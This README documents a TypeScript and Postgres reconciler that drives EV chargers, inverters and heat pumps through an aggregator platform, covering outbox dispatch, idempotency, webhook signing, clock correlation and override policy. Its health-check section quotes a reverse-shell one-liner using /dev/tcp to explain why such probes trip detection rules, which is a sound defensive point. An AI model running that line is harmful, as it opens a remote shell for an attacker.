# device-reconciler-platform

A desired-state reconciler for energy devices — EV chargers, inverters, batteries,
heat pumps — reached through an **aggregator platform** that exposes two separate
channels with two separate clocks.

This is the **operational** half. Its sibling, [`device-reconciler`](../device-reconciler),
is the **logical** half: a pure, dependency-free simulation that works out what it
even means to know whether a command took effect. That repository's README names
its own deliberate gaps, and this one is those gaps, taken seriously:

|              | `device-reconciler`                   | `device-reconciler-platform`                                                        |
| ------------ | ------------------------------------- | ----------------------------------------------------------------------------------- |
| the problem  | can I tell whether my command worked? | can I run that answer for a fleet, forever, through a restart?                      |
| state        | in memory                             | Postgres: phase, clock model, generation, durable timer                             |
| dispatch     | a function call                       | outbox → HTTP, idempotency-keyed, at-least-once                                     |
| the platform | an in-process simulator               | **a runnable HTTP service** in this repo: OAuth2, pagination, 429s, signed webhooks |
| failure      | a scenario                            | per-vendor rate limits, circuit breakers, jittered backoff, bounded concurrency     |
| evidence     | ten golden timelines                  | OpenTelemetry metrics and a readout endpoint                                        |
| dependencies | none                                  | `pg`, OpenTelemetry. No cloud, no AWS, no broker.                                   |

The argument behind both lives in **“Two Channels, Two Clocks”**
(`/articles/two-channels-two-clocks/` on fblln.github.io). Read that for the
reasoning; read the sibling repo for the pure logic; read this one for what it
costs to operate.

---

## The problem, in one paragraph

You cannot talk to consumer energy hardware directly. You talk to a platform,
which talks to a manufacturer's cloud, which talks to the device — over two
channels that share nothing:

|            | command channel                | telemetry channel                             |
| ---------- | ------------------------------ | --------------------------------------------- |
| direction  | you → device                   | device → you                                  |
| timestamps | **your** clock                 | the **device's** clock                        |
| tells you  | the instruction was _received_ | what the device was doing at some past moment |
| latency    | one path                       | a different path                              |
| failure    | one mode                       | a different mode                              |

So: **an ack is not an actuation**, **telemetry describes the past**, and **the
two timestamps are not comparable**. Which produces the question:

> I asked the charger to start 90 seconds ago. Telemetry says `STOPPED`, captured
> at a device time I cannot directly compare to my own.
> **Is the command failing, is my data stale, or can I simply not tell yet?**

The answer is tri-state — `after`, `before`, and **cannot tell** — and `unknown`
is a legitimate outcome that must be waited out rather than guessed past. Where a
device echoes back which instruction it last applied, the question collapses to
integer comparison and no clock is involved at all. That is always preferred.

## What this repository adds

### 1. Durable in-flight state

The phase holds a command id, a generation, a deadline and a device-clock
watermark. In the sibling repo a restart loses all of it and the loop re-issues a
command that is already outstanding — the exact failure the design exists to
prevent. Here:

- **phase, clock model and generation counter live in Postgres** (`db/schema.sql`),
  written in one transaction with the intent to send.
- **the deadline is a column, not a `setTimeout`.** `device.wake_at` plus
  `where wake_at <= now` is the timer, so it survives `SIGKILL`.
- **an outbox** separates deciding from sending, because two systems cannot be
  updated atomically and both orderings of "POST then write" are broken. Delivery
  is at-least-once, which is safe _only_ because the command id is also the
  `Idempotency-Key` — the two halves are a pair.
- **generations are minted by the database**, since a counter handed out twice
  makes a device's echo ambiguous.
- **work is claimed with `for update skip locked`** and held on an expiring
  lease, so a worker killed mid-reconcile strands nothing.

Time is stored as **bigint milliseconds, not `timestamptz`** — deliberately, so
that SQL cannot quietly perform the cross-clock comparison TypeScript forbids.
The reasoning is at the top of `db/schema.sql`.

### 2. Real I/O against a runnable mock platform

`src/platform/` is a real HTTP service, in this repository, that runs as a
container: OAuth2 client-credentials with short-lived tokens, a paginated device
list, a command endpoint that **requires** `Idempotency-Key` and replays the
original response, per-vendor rate limits returning `429` with `Retry-After`, and
signed webhook delivery that **retries, duplicates and reorders**.

Each simulated device has its own clock skew (a tenth of the fleet is minutes
wrong), telemetry latency, actuation delay, and pathology — acks-but-never-
applies, rejects-everything, reports-`APPLIED`-early, counts-or-doesn't. All of it
is a pure function of `(SEED, deviceId)`, so a failing run is replayable and
adding a device does not reshuffle the fleet.

Ingest (`src/service/ingest.ts`) is the only externally reachable surface, so it
is treated as a trust boundary: HMAC-SHA256 over `timestamp.body` with the
timestamp _inside_ the signed material, `timingSafeEqual`, a freshness window,
and replay protection as a unique index on `inbox.event_id`.

### 3. Scale and backpressure

Three vendors with deliberately different quotas, because a single global limit
starves the fast vendor or gets the slow one banned. Per vendor: a token bucket,
a circuit breaker with a half-open probe, and jittered exponential backoff. Work
runs through a bounded queue the connection pool is sized from. The four dispatch
outcomes are kept distinct because the right response differs:

- **gated** (our own limiter) — no attempt consumed; the request never happened.
- **429** — the attempt is _returned_; a command abandoned for being throttled is
  a command abandoned for being popular.
- **5xx / timeout** — retry with backoff, and count it against vendor health.
- **other 4xx** — abandon; retrying a malformed request is pure load.

Reconciliation is **webhook-driven plus swept**: events give latency, the sweep
gives completeness. A purely event-driven reconciler never revisits the device
that stopped talking, which is the one most likely to have drifted.

### 4. Observability — the two numbers that are the point

OpenTelemetry metrics via a **Prometheus pull exporter** (correct with nothing on
the other end; there is no collector in this repo and no cloud anywhere), plus
structured JSON logs and a readout at `/readout` and `/readout.txt`:

```
vendor          correlated   unknown   clock-fallback   after   before
ALL                    412     11.4%            48.3%     301       64
badger                 139      8.6%             0.0%     118       10
hare                   168      7.1%           100.0%     131       25
tortoise               105     22.9%            61.0%      52       29
```

- **unknown rate** — correlations that could not be decided at all. Zero means the
  tri-state was theatre and a boolean would have done. High means the declared
  skew and latency bounds are too loose for this fleet, which is an operational
  fix, not a code change.
- **clock-fallback rate** — correlations decided by clock bounds rather than a
  generation echo. This is the cost of the fleet's hardware in one number, and the
  procurement argument for devices that count.

`reconcile()` carries the branch it took (`Step.correlation`) — the one addition
to the ported core, and the reason this repository exists: the sibling can _argue_
that correlation is tri-state; a running system has to be able to _show it_.

Timeouts are reported as three distinct faults with three distinct owners, from
Azure's `ac` status: **silence** (the instruction may never have arrived — look at
connectivity and the platform's queue), **acknowledged** (it arrived and nothing
happened — look at the device), and **in progress** (the device said it was
working and never finished — it knows something it has not told us). A timeout
that cannot tell them apart sends somebody to read the wrong logs.

### 5. Override precedence, as a first-class concept

A command advances the generation; a human at the panel does not. So a fresh
reading that disagrees with intent while still reporting the generation we
converged at is _exact_ evidence that somebody else moved the device — same
channel, same counter, no clock. The sibling repo identifies that and stops,
deliberately: what to do about it is a policy, and fighting a human is right for
a charger on a tariff and wrong for someone who just turned the heating up.

Retrofitting a policy onto a loop that re-asserts unconditionally is painful, so
intent here has a **source** and a **precedence** from the start
(`src/core/override.ts`), resolved _upstream_ of the decision function so the
ported core needs no change:

- `schedule` — a tariff window or optimiser. Standing instruction, nobody watching.
- `local` — inferred from a third-party change. Never written by us.
- `operator` — explicit, attributable, recent, through our API.

Three outcomes: **assert** (converge, the normal case), **hold** (a local change
outranks a schedule for a bounded window, then the schedule resumes on its own —
via a durable timer, so it survives a restart), and **conflict** (two deliberate
writers disagree; stop asserting _and say so_, because the resolution is a human
decision and the only wrong move is to pick quietly). Hold and conflict both stop
asserting and differ in whether anyone is told — a system that cannot tell them
apart either pages on every button press or silently loses arguments with its
operator. The model is Kubernetes server-side apply: field ownership, and
conflicts reported rather than resolved by last-writer-wins.

The `local_change_at` timestamp is persisted because it **cannot be re-derived**:
the evidence is the device still reporting the generation we converged at, and the
moment we re-assert, the generation advances and the evidence is gone.

## Prior art

Every URL below was resolved before it was committed. Nothing here is cited from
memory — two citations in an earlier draft of the sibling repo turned out to be
dead links written from recall, which is the reason for the rule.

This is not a novel problem, and the industry has converged on **order by a
counter, not by a clock**:

- **Kubernetes API conventions** — [api-conventions.md](https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md).
  `metadata.generation` is "a sequence number representing a specific generation
  of the desired state", "Set by the system and monotonically increasing,
  per-resource". `status.observedGeneration` is "the `generation` most recently
  observed by the component responsible for acting upon changes to the desired
  state of the resource", and a condition's own `observedGeneration` is "the
  .metadata.generation that the condition was set based upon". Note the doc says
  _some_ resources report it, and attributes it to "the component responsible" —
  not specifically to a controller. [kstatus](https://github.com/kubernetes-sigs/cli-utils/blob/master/pkg/kstatus/README.md)
  is the library that reads those conventions to decide whether a resource has
  actually reconciled.
- **Azure IoT Plug and Play** — [the acknowledgement convention](https://learn.microsoft.com/azure/iot-pnp/concepts-convention),
  on [device twins](https://learn.microsoft.com/azure/iot-hub/iot-hub-devguide-device-twins).
  The hub manages a `$version` on the desired section; the device acknowledges by
  writing back a reported property carrying `av` (the acknowledged version), `ac`
  (a status: 200 accepted, **202 in progress, to finish later at 200**, 400/500
  refused or failed) and an optional `ad` description. **This repo's mock
  platform implements that convention**, `ac: 202` included — see
  `src/platform/sim.ts`. The 202 confirms nothing; its value is diagnostic, and
  that is exactly why it is worth having.
- **AWS IoT Device Shadow** — [shadow documents](https://docs.aws.amazon.com/iot/latest/developerguide/device-shadow-document.html):
  desired / reported / delta, a `version` that increments on every update and is
  checked for optimistic concurrency, and a `clientToken` that ties a response
  back to the request that caused it. The round-tripped client counter in this
  repo's command endpoint plays the `clientToken` role.
- **Eclipse Ditto** — [digital twins](https://eclipse.dev/ditto/basic-feature.html).
  Ditto persists and indexes both a reported and a desired state, and its own
  documentation says the reconciling logic between them "is up to your
  application or device firmware". It stores the two states and does **not**
  drive the device toward the target. That gap is what this repository is. (There
  is an [open epic](https://github.com/eclipse-ditto/ditto/issues/696) proposing
  Ditto clear `desiredProperties` once reported catches up — a proposal, not
  shipped behaviour.)
- **Eclipse Hono** — [telemetry vs command &amp; control](https://github.com/eclipse/hono)
  as explicitly separate APIs in opposite directions, with wildly different
  volumes. **Eclipse Kanto** ([site](https://eclipse.dev/kanto/)) is the
  edge-side counterpart, bridging a device's twin channel to Hono and to the AWS
  Device Shadow.
- **OCPP 1.6** — [spec via the Open Charge Alliance](https://openchargealliance.org/download-ocpp/)
  (behind the download page; released 2015, no stable deep link).
  `RemoteStartTransaction.conf` reports only that the charge point "has accepted
  the request and will attempt to start a transaction"; the real state arrives
  separately via `StartTransaction` and `StatusNotification`, and the two are
  observed to diverge. _Ack-is-not-actuation, in a spec._ The serious open
  implementation is [EVerest](https://github.com/EVerest/everest) (LF Energy,
  Apache 2.0, OCPP 1.6 and 2.0.1).
- **Z-Wave Supervision CC** — [Silicon Labs docs](https://docs.silabs.com/z-wave/7.21.3/zwave-api/supervision)
  and [zwave-js](https://github.com/zwave-js/node-zwave-js/discussions/6515).
  The same problem solved at the wire protocol: a supervised SET is answered with
  a status saying whether the command was understood **and executed**, and
  zwave-js separates never-sent, received-but-not-executed and invalid-value,
  falling back to a read-back GET for devices that refuse Supervision — with the
  caveat that a GET straight after a SET can return a transitional value.
- **Home Assistant** — [`optimistic` vs `assumed_state`](https://www.home-assistant.io/integrations/lock.mqtt/),
  where a core developer's distinction is that _assumed_ means state is never
  reported at all, while _optimistic_ means acting as though the command worked.
  [aiohomematic](https://sukramj.github.io/aiohomematic/user/features/optimistic_updates)
  applies an optimistic update, starts a 30-second timer, and reverts with a
  warning if nothing confirms. Optimistic entities also have no confirmed state
  after a restart — **the persistence gap, in production software**.

On ordering events across clocks you do not control:

- **Lamport 1978**, _Time, Clocks, and the Ordering of Events in a Distributed
  System_, CACM 21(7):558–565, [doi:10.1145/359545.359563](https://doi.org/10.1145/359545.359563).
  Logical clocks "may be implemented by counters with no actual timing
  mechanism" — the original statement of why a counter beats a clock. (The DOI
  resolves in a browser; ACM returns 403 to automated requests.)
- **Cristian 1989**, _Probabilistic clock synchronization_, Distributed Computing
  3:146–158, [doi:10.1007/BF01784024](https://doi.org/10.1007/BF01784024).
  Reading a remote clock across unbounded delay yields an _interval_, not a
  point; the midpoint minimises maximum error, and a successful read tells you
  the precision achieved. This is the formal shape of `capturedAfter`.
- **Spanner**, OSDI 2012, [paper](https://research.google/pubs/spanner-googles-globally-distributed-database-2/).
  `TT.now()` returns `[earliest, latest]`, and commit wait _pays_ for the
  uncertainty rather than hiding it. The closest architectural precedent for
  tri-state correlation: the interval is exposed, and the system waits it out
  instead of collapsing it into a guess.
- **RFC 5905 (NTP)**, [§10, the clock filter](https://www.rfc-editor.org/rfc/rfc5905).
  `src/core/clock.ts` keeps exactly one number — the minimum observed delay —
  for the reason NTP does: delay is non-negative and variable, so the minimum is
  the tightest available estimate. The crisp phrasing that the minimum delay
  "generally represents the most accurate offset statistic" is
  [NTPsec's documentation](https://docs.ntpsec.org/latest/stats.html), not the
  RFC's normative text. The asymmetry matters here and is derived in the file:
  that minimum bounds the offset from _above_ only, which is why proving "after"
  additionally requires a declared maximum latency.
- **The Dataflow Model**, Akidau et al., PVLDB 8(12):1792–1803,
  [paper](https://www.vldb.org/pvldb/vol8/p1792-Akidau.pdf). Watermarks as a
  bound on event-time completeness. Borrowed here by name: the per-device
  watermark keeps "is anything new?" an exact same-clock comparison, so the lossy
  cross-clock estimate is needed in exactly one place.

And for the operational half, which is what this repository adds:

- **Transactional outbox** — [the pattern](https://microservices.io/patterns/data/transactional-outbox.html),
  for the reason in `db/schema.sql`: deciding and sending cannot be made atomic,
  and both orderings of "POST then write" lose or duplicate.
- **Idempotency keys** — [Stripe's](https://docs.stripe.com/api/idempotent_requests),
  which replay the original response for a repeated key. The mock platform
  implements this and **requires** the header, because a platform that accepts
  unkeyed commands cannot promise at-most-once actuation.
- **Webhook signatures** — [Stripe's scheme](https://docs.stripe.com/webhooks):
  `t=…,v1=…`, with the timestamp inside the signed material and a replay window
  backed by event-id deduplication.
- **`SELECT … FOR UPDATE SKIP LOCKED`** — [Postgres docs](https://www.postgresql.org/docs/current/sql-select.html).
  The whole work-distribution mechanism: no broker, no partition assignment, no
  leader election.
- **Backoff with jitter** — [the AWS Builders' Library article](https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/),
  whose measurements are why `src/core/backoff.ts` uses full jitter rather than
  plain doubling.
- **Kubernetes server-side apply** — [field ownership and conflicts](https://kubernetes.io/docs/reference/using-api/server-side-apply/).
  The model for `src/core/override.ts`: when two managers disagree, report a
  conflict to whoever owns the field rather than letting the last writer win.
- **Temporal** — [flashing 2,300 conference badges](https://temporal.io/blog/ignition-flashing-2-300-conference-badges-with-temporal),
  one durable state machine per physical device, surviving devices that reboot
  mid-process. The closest analogue to the durable-deadline half here, and worth
  considering instead of hand-rolling timers — though no maintained open-source
  project implements the whole pattern for this domain.

## Who mints the counter

Worth stating plainly, because the sibling repo leaves it open and gets it
half-wrong.

The counter must be minted at the **single serialisation point for a device's
desired state**. Kubernetes sets `metadata.generation` in the API server; Azure
IoT Hub manages `$version` in the hub. Two writers each minting their own
sequence produce counters that cannot be compared, and each reads the other's
work as a third-party change. The sibling repo mints it in its process, which is
sound only while exactly one reconciler exists — and a counter that lives in a
process is a counter that restarts.

This repository has two serialisation points and uses both, for different jobs:

- **the platform** mints `av` on the way in, before the device is consulted,
  exactly as Azure does. A client never invents it; it is read from the
  acknowledgement and never sent in a request.
- **our database** mints the client generation, under the device's row lease, via
  a monotonic column. `FOR UPDATE SKIP LOCKED` plus that column means exactly one
  writer advances it per device, across any number of reconciler processes — the
  same guarantee an API server gives, obtained from the row lock rather than from
  there being only one process.

Both are round-tripped. The client generation is what correlation compares,
because it is the only counter in a namespace the reconciler can check against
its own phase — `av` is not one until the acknowledgement arrives, which is
strictly after a phase has already been committed saying a command is in flight.
A platform offering only `av` forces the clock fallback for one whole capture
interval after every command; this one offers both, and the readout reports how
often the fallback was needed anyway.

## Layout

| path            | what                                                                                                                     | why separate                                                                                                                      |
| --------------- | ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- |
| `src/core/`     | the pure half: time, clock, correlation, decision, contracts, rate limit, breaker, backoff, schedule, signature, readout | no I/O, no `Date.now()`, no randomness it does not receive — testable with a virtual clock, and the only code under the 100% gate |
| `src/platform/` | the runnable mock aggregator platform                                                                                    | a fake with a clock, because the failures here are timing failures                                                                |
| `src/adapter/`  | HTTP client and the per-vendor gate                                                                                      | the error model is the design: outcomes split by what the caller should _do_                                                      |
| `src/store/`    | Postgres: devices, outbox, inbox, channels, decisions                                                                    | one parse boundary; the two channels stay two tables                                                                              |
| `src/service/`  | worker, dispatcher, ingest, sweep, queue, report                                                                         | the loops. No decisions live here                                                                                                 |
| `src/app.ts`    | the reconciler process                                                                                                   | wiring only                                                                                                                       |
| `db/schema.sql` | the durable state, with the reasoning                                                                                    | the outbox and bigint-milliseconds notes are the two to read                                                                      |

`src/core/time.ts`, `clock.ts`, `correlate.ts`, `reconcile.ts` and `contracts.ts`
are **ported verbatim** from the sibling repo (plus `Step.correlation`), with a
banner at the top of each saying why they are vendored rather than depended on:
publishing a package from a repository whose whole claim is "no dependencies"
would destroy the property it exists to demonstrate.

## Running it

```bash
npm install
npm run up          # docker compose up -d --wait — Postgres, platform, reconciler
npm run demo        # drives the fleet and prints the readout
npm run logs        # follow all three services
npm run down
```

`--wait` returns only once every service reports healthy, so a script or an agent
can bring the stack up and start asserting with no `sleep`. That works because
every service has a real health check — see the next section, which is not a
tangent.

Local, without Docker, needs only a Postgres:

```bash
PORT=9900 WEBHOOK_URL=http://localhost:9910/webhooks npm run platform
DATABASE_URL=postgres://... npm run reconciler
```

Requires Node 24+, which strips TypeScript natively — **no build step, no
bundler, no `dist/`**. Dev tooling is TypeScript 7, oxlint 1.x and Prettier 3.x,
all current.

## Health checks are not `/dev/tcp`

Every readiness probe here is either an exec-form HTTP request from the runtime
the image already ships (`src/platform/healthcheck.ts`) or `pg_isready`. None of
them is `bash -c '< /dev/tcp/127.0.0.1/8080'`.

That line is the conventional answer for a container with no `curl`, and it is
byte-for-byte the construct every reverse-shell detection rule is written
against: a process wiring one of its own standard streams to a network connection
instead of a terminal. A runtime sensor cannot distinguish it from
`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, because the only difference is the
destination and a signature cannot be written on a destination. Suppressing the
finding means teaching the detector to look away from `bash` in containers.

An HTTP probe also proves _more_: a 200 means a server parsed a request and
answered it, whereas a listening socket only means something bound a port.
Listening and ready are different states. Where an image has a runtime but no
HTTP client, the probe to reach for is a `/proc/net/tcp` grep in exec form —
reading a file is not opening a socket.

Long version: **“The Health Check Was a Reverse Shell”** on fblln.github.io.

## Engineering standards

- **Wide comments that explain why.** Every module states the constraint, the
  trade-off, or the failure mode it guards against. A reader should never have to
  reverse-engineer intent from mechanics.
- **Invariants as executable contracts.** I1–I9 (`src/core/contracts.ts`) run on
  **every** decision in production, not only in tests, because a contract that
  only runs in tests is a comment. I9 is new here: the correlation a decision
  reports must agree with whether the device reported a generation — the readout
  is a fact about the fleet, so the strategy choice gets pinned.
- **Deliberate simplifications are marked `ponytail:`** with the ceiling they
  have and the upgrade path, so a shortcut is a read rather than a discovery.
- **Strict TypeScript**: `erasableSyntaxOnly`, `noUncheckedIndexedAccess`,
  `exactOptionalPropertyTypes`, `noPropertyAccessFromIndexSignature`.

## Status: what is not done yet

Honest list, because an unfinished thing described as finished is worse than an
unfinished thing.

- **Tests are not written.** The intended shape, and the bar the sibling repo
  sets: unit and property tests over `src/core/**` on a virtual clock with a
  seeded LCG and a 100% line/function coverage gate (`npm run test:coverage` is
  wired for it); Testcontainers integration tests against Postgres and the
  in-process platform; a **restart test** that `SIGKILL`s the reconciler between
  the outbox commit and the dispatch, restarts it, and asserts the platform's
  `actuations` counter stayed at one while `idempotentReplays` rose; and a perf
  budget on the decision function.
- **CI workflow** is not written. It should run typecheck, lint, format, the
  coverage gate, the integration suite, and a `docker compose up --wait` smoke.
- **Partly executed.** The mock platform has been run and exercised by hand:
  OAuth2, pagination, the Azure `av`/`ac`/`ad` acknowledgement, and an idempotent
  replay returning the identical response for a repeated key while the command
  count stayed at one — which is the exact property the restart test will assert.
  The reconciler has **not** been run against a live Postgres, so expect the
  first integration pass to find SQL and wiring defects.
- `npm run demo` and the readout numbers above are the intended output, not a
  recorded run.

## Deliberate limits

- **One boolean intent** (`charging`). The interesting part is the correlation
  and its provenance, not the schema.
- **Override precedence is implemented; override _policy_ is one choice of many.**
  A bounded hold with a conflict escalation is defensible and is not the only
  defensible answer. It is a parameter and a pure function precisely so the next
  answer is a config change and a unit test.
- **One process, three loops.** Independent failure modes would be split in a
  real deployment; at this size splitting them would add a broker to prove
  something the loops already demonstrate. They are separate functions precisely
  so splitting them later is a change to `src/app.ts` only.
- **The gate is per process.** A device is reconciled by one process at a time,
  but two processes share a vendor quota and each paces to the full limit. The
  429 path self-corrects within one window; a shared bucket is the upgrade.
- **No migration history.** `create table if not exists`, applied at startup, so
  a clean machine needs no migration step. The moment two schema versions must
  coexist, this needs a real migration tool.
- **The skew and latency bounds are declared assumptions, not constants.**
  Tighter bounds decide more often and are wrong more often. That trade-off
  belongs to whoever knows the fleet, so it is an environment variable — and the
  readout exists so the person changing it can see the effect.
